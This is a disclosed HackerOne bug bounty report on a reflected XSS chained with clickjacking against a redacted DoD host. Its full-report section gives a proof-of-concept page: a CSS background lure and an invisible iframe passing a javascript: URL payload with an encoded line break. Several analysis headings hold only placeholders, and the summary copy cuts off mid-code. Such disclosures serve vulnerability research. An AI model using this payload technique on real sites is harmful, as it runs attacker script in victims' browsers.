# Reflected XSS through ClickJacking

## Metadata
- **Source:** HackerOne
- **Report:** 1171403 | https://hackerone.com/reports/1171403
- **Submitted:** 2021-04-21
- **Reporter:** sazouki
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** None
- **Category:** web-api

## Summary
**Description:**

Hello DoD team

i found an reflected XSS that require user interaction, but it's suspicious due the reflected payload in the page

███████

So in this case i chain it with click-jacking with image background same like the legal website to make it more trusting

████████

below is the code

```code
<style>

div {
       position:absolute;
       top:200px;
       left:900px;
     

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

**Description:**

Hello DoD team

i found an reflected XSS that require user interaction, but it's suspicious due the reflected payload in the page

███████

So in this case i chain it with click-jacking with image background same like the legal website to make it more trusting

████████

below is the code

```code
<style>

div {
       position:absolute;
       top:200px;
       left:900px;
       
   }
 body {

 	background-image: url('1.png');
 	background-repeat: no-repeat;
 	background-position: 300px 5px;

 }
</style>

<iframe src="https://███████?URL=javascript:alert(document.domain)//%0D%0A&#x22;https://google.com" id="xxx" width=100% height=100% style="opacity: 0;"></iframe>

```

## Impact

attacked can run malicious code in the victim browser

## System Host(s)
www.██████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
host the provided code with the background image and send it to the victim

## Suggested Mitigation/Remediation Actions




</details>

---
*Analysed by Claude on 2026-05-24*
